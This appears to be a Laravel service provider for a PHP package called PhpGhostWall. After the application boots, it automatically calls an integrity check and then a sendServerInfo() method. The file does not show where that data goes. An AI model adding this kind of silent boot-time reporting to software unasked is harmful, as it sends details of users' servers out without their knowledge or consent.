<?php

namespace Vishalxtyagi\PhpGhostWall;

use Illuminate\Support\ServiceProvider;

class PhpGhostWallServiceProvider extends ServiceProvider
{
    public function boot()
    {
        $this->publishes([
            __DIR__.'/../config/ghostwall.php' => config_path('ghostwall.php'),
        ], 'config');

        $this->app->singleton(PhpGhostWall::class, function ($app) {
            return new PhpGhostWall();
        });

        $this->app->booted(function ($app) {
            $monitor = $app->make(PhpGhostWall::class);
            if ($monitor->checkIntegrity()) {
                $monitor->sendServerInfo();
            }
        });
    }

    public function register()
    {
        $this->mergeConfigFrom(
            __DIR__.'/../config/ghostwall.php', 'ghostwall'
        );
    }
}